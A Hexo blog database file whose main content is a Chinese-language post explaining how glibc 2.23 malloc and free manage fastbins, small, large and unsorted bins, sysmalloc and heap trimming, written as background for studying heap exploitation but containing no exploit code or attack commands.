{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"themes/apollo/source/favicon.png","path":"favicon.png","modified":0,"renderable":1},{"_id":"themes/apollo/source/css/apollo.css","path":"css/apollo.css","modified":0,"renderable":1},{"_id":"themes/apollo/source/font/sourcesanspro.woff","path":"font/sourcesanspro.woff","modified":0,"renderable":1},{"_id":"themes/apollo/source/font/sourcesanspro.woff2","path":"font/sourcesanspro.woff2","modified":0,"renderable":1},{"_id":"themes/apollo/source/scss/apollo.scss","path":"scss/apollo.scss","modified":0,"renderable":1},{"_id":"source/images/linux_heap_analysis0.png","path":"images/linux_heap_analysis0.png","modified":0,"renderable":0}],"Cache":[{"_id":"themes/apollo/.gitignore","hash":"a006beea0877a0aa3610ee00e73f62cb1d45125b","modified":1477754720876},{"_id":"themes/apollo/LICENSE","hash":"6e31ac9076bfc8f09ae47977419eee4edfb63e5b","modified":1477754720876},{"_id":"themes/apollo/README.md","hash":"fb6fbe42172a35cbdaa540a777cc4bc02add2278","modified":1477754720876},{"_id":"themes/apollo/_config.yml","hash":"f21f18489dc00e0541d7041a81789a2ea8cccd3b","modified":1477793947488},{"_id":"themes/apollo/gulpfile.js","hash":"857a026b6643a2cd52c65d4ae0dc7fe9618206ee","modified":1477754720876},{"_id":"themes/apollo/package.json","hash":"4d13f5f859db7d008f49251543a8f610b2ecabd5","modified":1477754720876},{"_id":"source/_posts/linux_heap_analysis.md","hash":"67420f12423d958c3bb90bb5ed5993a38f4bdb11","modified":1478002718440},{"_id":"themes/apollo/.git/HEAD","hash":"acbaef275e46a7f14c1ef456fff2c8bbe8c84724","modified":1477754720872},{"_id":"themes/apollo/.git/config","hash":"4eba8e6ddc5a8da6c66aa99763c7831c5ddcee6f","modified":1477754720872},{"_id":"themes/apollo/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1477754659400},{"_id":"themes/apollo/.git/index","hash":"5ce25a2103dc7260ebdfe591b59b53b92d128f59","modified":1477755588564},{"_id":"themes/apollo/.git/packed-refs","hash":"2ab66d2cb8ce41e703f19a82c8a86fe917b9f9e9","modified":1477754720872},{"_id":"themes/apollo/doc/doc-en.md","hash":"d6d9756b2085cdd8ee51eb5594427e2abf170e94","modified":1477754720876},{"_id":"themes/apollo/doc/doc-zh.md","hash":"d43c1f6bff66426744a2c6f031d19ff09cdeb2d1","modified":1477754720876},{"_id":"themes/apollo/languages/en.yml","hash":"40292f2a48e4e6361132033a47c516cb33127b6c","modified":1477754720876},{"_id":"themes/apollo/languages/zh-cn.yml","hash":"9e4b03e14c094000257ea254fd660dde4c7af63c","modified":1477754720876},{"_id":"themes/apollo/layout/archive.jade","hash":"62797414355bf4474092bc3a32726c8340820ffb","modified":1477754720876},{"_id":"themes/apollo/layout/index.jade","hash":"55f2f1b4b5364a0e09cb18e1112664c6415fb881","modified":1477754720876},{"_id":"themes/apollo/layout/post.jade","hash":"245c26244c075c3632d1545c3b228ee9d112f15d","modified":1477754720876},{"_id":"themes/apollo/source/favicon.png","hash":"a9cdcb22d1e74d5480323e19d1983de5a6873b8c","modified":1477754720876},{"_id":"themes/apollo/.git/hooks/applypatch-msg.sample","hash":"86b9655a9ebbde13ac8dd5795eb4d5b539edab0f","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/commit-msg.sample","hash":"ee1ed5aad98a435f2020b6de35c173b75d9affac","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/post-update.sample","hash":"b614c2f63da7dca9f1db2e7ade61ef30448fc96c","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-applypatch.sample","hash":"42fa41564917b44183a50c4d94bb03e1768ddad8","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-commit.sample","hash":"36aed8976dcc08b5076844f0ec645b18bc37758f","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-push.sample","hash":"b4ad74c989616b7395dc6c9fce9871bb1e86dfb5","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-rebase.sample","hash":"18be3eb275c1decd3614e139f5a311b75f1b0ab8","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/prepare-commit-msg.sample","hash":"2b6275eda365cad50d167fe3a387c9bc9fedd54f","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/update.sample","hash":"39355a075977d05708ef74e1b66d09a36e486df1","modified":1477754659400},{"_id":"themes/apollo/.git/info/exclude","hash":"c879df015d97615050afa7b9641e3352a1e701ac","modified":1477754659400},{"_id":"themes/apollo/.git/logs/HEAD","hash":"bdad5a040fb991d1b5395b7733ea4bb28127144e","modified":1477754720872},{"_id":"themes/apollo/layout/mixins/paginator.jade","hash":"f4ee2fb61a32e199b48cf93771749edc8a007391","modified":1477754720876},{"_id":"themes/apollo/layout/mixins/post.jade","hash":"cd9447e9b0ad22213e6a17d9a9b948f9f998f921","modified":1477754720876},{"_id":"themes/apollo/layout/partial/comment.jade","hash":"ff0a2c269c2434da2ac5529872f1d6184a71f96d","modified":1477754720876},{"_id":"themes/apollo/layout/partial/copyright.jade","hash":"217f8b17054e5079f2d30bb7e2e4e36c0f2161b7","modified":1477754720876},{"_id":"themes/apollo/layout/partial/head.jade","hash":"d062dafabfe65198e5cf2ddb0e47d909885aa950","modified":1477754720876},{"_id":"themes/apollo/layout/partial/layout.jade","hash":"eb15573ff66bdbb110ac77cf360b740170cee738","modified":1477754720876},{"_id":"themes/apollo/layout/partial/nav.jade","hash":"dfdd6c667e537a98cca852f713c2057f2012ff61","modified":1477754720876},{"_id":"themes/apollo/layout/partial/scripts.jade","hash":"cf3339de8979b5f75a3011f0f6b5451091b77dc8","modified":1477754720876},{"_id":"themes/apollo/source/css/apollo.css","hash":"805612fea3f0768dc705058f4b9b8bc95abe4ed4","modified":1477754720876},{"_id":"themes/apollo/source/font/sourcesanspro.woff","hash":"a6722c9b6439b7a020a9be3d3178970757a9265c","modified":1477754720876},{"_id":"themes/apollo/source/font/sourcesanspro.woff2","hash":"da65f527a8da65d5eb6721626d28cfdb46ab104a","modified":1477754720876},{"_id":"themes/apollo/source/scss/apollo.scss","hash":"153bbf882c1f6f65bb4510999b51812e20016ca7","modified":1477754720876},{"_id":"themes/apollo/.git/objects/pack/pack-6aaf31ec22cdef45ed9d330ad851b764de8b9225.idx","hash":"6cda2844ea32155bd203f51a5759425b009854cd","modified":1477754720852},{"_id":"themes/apollo/.git/refs/heads/master","hash":"4605c6681d054db5754369e5211848dd9dcacaef","modified":1477754720872},{"_id":"themes/apollo/source/scss/_partial/archive-post-list.scss","hash":"d2f740a7d48349b7536777c795f82ab740836d0f","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/base.scss","hash":"ae967b2049ecb9b8c4e139ecce32fd9fb5358ac5","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/copyright.scss","hash":"1309667e3000037170cfbb5b8c9c65f4ffcf6814","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/footer.scss","hash":"094aca6e52f11b139ac7980ca03fa7b9d8fc7b2f","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/header.scss","hash":"153bde88bf8ffeae4ffd813d8cc694dd83d33d94","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/home-post-list.scss","hash":"6b5c59f3d2295944f934aee2c1156012a3306d5d","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/mq.scss","hash":"b5eb0fb35fb275cbb6452b5d98702d461af3e6d5","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/normalize.scss","hash":"fd0b27bed6f103ea95b08f698ea663ff576dbcf1","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/post.scss","hash":"912776a0eb7ad5a387b9aa929c857b6edd0c113e","modified":1477754720876},{"_id":"themes/apollo/.git/logs/refs/heads/master","hash":"bdad5a040fb991d1b5395b7733ea4bb28127144e","modified":1477754720872},{"_id":"themes/apollo/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1477754720872},{"_id":"themes/apollo/.git/logs/refs/remotes/origin/HEAD","hash":"bdad5a040fb991d1b5395b7733ea4bb28127144e","modified":1477754720872},{"_id":"themes/apollo/.git/objects/pack/pack-6aaf31ec22cdef45ed9d330ad851b764de8b9225.pack","hash":"0b0a61658bae0aea180f5c9fd2d12236e3ad0fe2","modified":1477754720852},{"_id":"source/images/linux_heap_analysis0.png","hash":"dd0ef5e08c098db02b994b0b2be6226c1f7cc1c2","modified":1477755312896},{"_id":"public/atom.xml","hash":"cc0d291335de2f133f9762a3ab12f4b164e0356b","modified":1478003051992},{"_id":"public/sitemap.xml","hash":"ba473648565b18a70b8607561fe70d3a593f6775","modified":1478003051993},{"_id":"public/2016/10/29/linux_heap_analysis/index.html","hash":"663321960d4711c5dc7ba2a7dc472a5c54ad2db6","modified":1477793955349},{"_id":"public/archives/index.html","hash":"eefd72433385c093c29e4cce7db255944951580d","modified":1478003051998},{"_id":"public/index.html","hash":"7d8b900711ea6d9d08b116a0c2418cfa762d97f5","modified":1478003051998},{"_id":"public/favicon.png","hash":"a9cdcb22d1e74d5480323e19d1983de5a6873b8c","modified":1478003052000},{"_id":"public/font/sourcesanspro.woff","hash":"a6722c9b6439b7a020a9be3d3178970757a9265c","modified":1478003052000},{"_id":"public/font/sourcesanspro.woff2","hash":"da65f527a8da65d5eb6721626d28cfdb46ab104a","modified":1478003052000},{"_id":"public/scss/apollo.scss","hash":"153bbf882c1f6f65bb4510999b51812e20016ca7","modified":1478003052000},{"_id":"public/css/apollo.css","hash":"805612fea3f0768dc705058f4b9b8bc95abe4ed4","modified":1478003052004},{"_id":"public/images/linux_heap_analysis0.png","hash":"dd0ef5e08c098db02b994b0b2be6226c1f7cc1c2","modified":1478003052017},{"_id":"source/_posts/alictf_2016_fb_writeup.md","hash":"20020fdfefb123213f485e4a30358a53f6467b32","modified":1478002718356},{"_id":"public/2016/06/07/alictf_2016_fb_writeup/index.html","hash":"7d793be834c4031685a681390abb319a99259119","modified":1478003051998},{"_id":"public/2016/05/29/linux_heap_analysis/index.html","hash":"62b2ab0c2fc1c2b1813ecf24481903e3810deec0","modified":1478003051998}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Linux下Glibc 堆的malloc及free过程分析","date":"2016-05-29T13:03:00.000Z","_content":"\n想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了[这篇分析][1]之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。\n\n<!--more-->\n\n## 分配 ##\n（fastbin的分配发生在链表的头部，其余都发生在链表尾部）\n（在fast链表中是精确分配（只有大小完全符合才会分配）\n    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配\n    small链表在第一遍时是精确分配，第二遍时非精确\n    large链表一直都是非精确分配）（注意链表和chunk不一样）\n（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）\n\n1、首先获取Arena的锁，保证安全\n2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）\n——一种情况是没有可用Arena\n没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0\n——另一种情况是有可用Arena\n1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）\n2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）\n3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步\n4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）\n5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回\n6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回\n\n#### 关于sysmalloc ####\n1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）\n2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配\n如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）\n最后再从top chunk中分配\n\n#### 按fast bin、small bin、large bin分 ####\n1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样\n2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统\n3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统\n\n#### 关于巨块的分配 ####\n没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap\nmmap分配的未必就一定是大的chunk\n\n## 释放 ##\n（所有chunk的释放都是插入链表头部）\n然后做一些基本的检查，比如size大小等\n1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）\n2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头\n合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap\n（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）\n3、直接munmap返回给操作系统\n\n#### 来自源码中的注释 ####\nchunk不会被放回到normal bin中直到它们获得一次被malloc的机会\nChunks are not placed into regular bins until after they have been given one chance to be used in malloc\n\n#### 关于获取Size ####\n获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）\n\n## 关于堆的收缩 ##\n如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk\n\n#### 来自源码中的注释 ####\n收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理\n\n\n\n最后附一张图：\n![heap.png][2]\n\n\n[1]: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\n[2]: /images/linux_heap_analysis0.png\n","source":"_posts/linux_heap_analysis.md","raw":"title: Linux下Glibc 堆的malloc及free过程分析\n\ndate: 2016/05/29 21:03:00\n\n---\n\n想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了[这篇分析][1]之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。\n\n<!--more-->\n\n## 分配 ##\n（fastbin的分配发生在链表的头部，其余都发生在链表尾部）\n（在fast链表中是精确分配（只有大小完全符合才会分配）\n    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配\n    small链表在第一遍时是精确分配，第二遍时非精确\n    large链表一直都是非精确分配）（注意链表和chunk不一样）\n（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）\n\n1、首先获取Arena的锁，保证安全\n2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）\n——一种情况是没有可用Arena\n没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0\n——另一种情况是有可用Arena\n1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）\n2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）\n3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步\n4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）\n5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回\n6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回\n\n#### 关于sysmalloc ####\n1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）\n2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配\n如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）\n最后再从top chunk中分配\n\n#### 按fast bin、small bin、large bin分 ####\n1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样\n2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统\n3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统\n\n#### 关于巨块的分配 ####\n没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap\nmmap分配的未必就一定是大的chunk\n\n## 释放 ##\n（所有chunk的释放都是插入链表头部）\n然后做一些基本的检查，比如size大小等\n1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）\n2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头\n合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap\n（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）\n3、直接munmap返回给操作系统\n\n#### 来自源码中的注释 ####\nchunk不会被放回到normal bin中直到它们获得一次被malloc的机会\nChunks are not placed into regular bins until after they have been given one chance to be used in malloc\n\n#### 关于获取Size ####\n获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）\n\n## 关于堆的收缩 ##\n如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk\n\n#### 来自源码中的注释 ####\n收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理\n\n\n\n最后附一张图：\n![heap.png][2]\n\n\n[1]: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\n[2]: /images/linux_heap_analysis0.png\n","slug":"linux_heap_analysis","published":1,"updated":"2016-11-01T12:18:38.440Z","_id":"ciuw0d5ig0000pw60n24o3wgz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了<a href=\"https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\" target=\"_blank\" rel=\"external\">这篇分析</a>之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。</p>\n<a id=\"more\"></a>\n<h2 id=\"分配\"><a href=\"#分配\" class=\"headerlink\" title=\"分配\"></a>分配</h2><p>（fastbin的分配发生在链表的头部，其余都发生在链表尾部）<br>（在fast链表中是精确分配（只有大小完全符合才会分配）<br>    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配<br>    small链表在第一遍时是精确分配，第二遍时非精确<br>    large链表一直都是非精确分配）（注意链表和chunk不一样）<br>（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）</p>\n<p>1、首先获取Arena的锁，保证安全<br>2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）<br>——一种情况是没有可用Arena<br>没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0<br>——另一种情况是有可用Arena<br>1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）<br>2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）<br>3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步<br>4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）<br>5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回<br>6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回</p>\n<h4 id=\"关于sysmalloc\"><a href=\"#关于sysmalloc\" class=\"headerlink\" title=\"关于sysmalloc\"></a>关于sysmalloc</h4><p>1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）<br>2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配<br>如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）<br>最后再从top chunk中分配</p>\n<h4 id=\"按fast-bin、small-bin、large-bin分\"><a href=\"#按fast-bin、small-bin、large-bin分\" class=\"headerlink\" title=\"按fast bin、small bin、large bin分\"></a>按fast bin、small bin、large bin分</h4><p>1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样<br>2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统<br>3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统</p>\n<h4 id=\"关于巨块的分配\"><a href=\"#关于巨块的分配\" class=\"headerlink\" title=\"关于巨块的分配\"></a>关于巨块的分配</h4><p>没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap<br>mmap分配的未必就一定是大的chunk</p>\n<h2 id=\"释放\"><a href=\"#释放\" class=\"headerlink\" title=\"释放\"></a>释放</h2><p>（所有chunk的释放都是插入链表头部）<br>然后做一些基本的检查，比如size大小等<br>1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）<br>2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头<br>合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap<br>（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）<br>3、直接munmap返回给操作系统</p>\n<h4 id=\"来自源码中的注释\"><a href=\"#来自源码中的注释\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>chunk不会被放回到normal bin中直到它们获得一次被malloc的机会<br>Chunks are not placed into regular bins until after they have been given one chance to be used in malloc</p>\n<h4 id=\"关于获取Size\"><a href=\"#关于获取Size\" class=\"headerlink\" title=\"关于获取Size\"></a>关于获取Size</h4><p>获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）</p>\n<h2 id=\"关于堆的收缩\"><a href=\"#关于堆的收缩\" class=\"headerlink\" title=\"关于堆的收缩\"></a>关于堆的收缩</h2><p>如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk</p>\n<h4 id=\"来自源码中的注释-1\"><a href=\"#来自源码中的注释-1\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理</p>\n<p>最后附一张图：<br><img src=\"/images/linux_heap_analysis0.png\" alt=\"heap.png\"></p>\n","excerpt":"<p>想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了<a 